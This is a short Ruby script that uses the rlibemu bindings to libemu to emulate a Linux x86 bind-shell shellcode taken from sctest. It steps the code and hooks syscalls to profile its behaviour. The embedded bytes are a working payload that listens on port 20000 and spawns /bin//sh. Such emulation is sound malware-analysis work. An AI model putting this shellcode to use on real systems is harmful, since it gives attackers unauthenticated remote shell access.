# based on sctest
require 'rlibemu'
include Libemu

CODE_OFFSET=0x417000

# linux bindshell (test from sctest)
shellcode =
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80" +
"\x89\xc7\x52\x66\x68\x4e\x20\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0" +
"\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50" +
"\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49" +
"\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69" +
"\x89\xe3\x51\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80"

emu = Emulator.new

#set the registers to the initial values
emu.cpu_reg32_set(Emulator::EAX, 0)
emu.cpu_reg32_set(Emulator::ECX, 0)
emu.cpu_reg32_set(Emulator::EDX, 0)
emu.cpu_reg32_set(Emulator::EBX, 0)
emu.cpu_reg32_set(Emulator::ESP, 0)
emu.cpu_reg32_set(Emulator::EBP, 0)
emu.cpu_reg32_set(Emulator::ESI, 0)
emu.cpu_reg32_set(Emulator::EDI, 0)

# set the flags
emu.cpu_eflags_set(0)

# write the code to the offset
emu.memory_write_block(CODE_OFFSET, shellcode)

# set eip to the code
emu.cpu_eip_set(CODE_OFFSET)
emu.memory_write_block(0x0012fe98, shellcode)
emu.cpu_reg32_set(Emulator::ESP, 0x0012fe98)

# test
env = Environment.new(emu)
j = 0

300.times do |i|
	if emu.cpu_parse == -1
	  break
	end
	if env.linux_syscall_check
	  env.linux_syscall_hook
	else
	  emu.cpu_step
	end
end

env.profile_debug
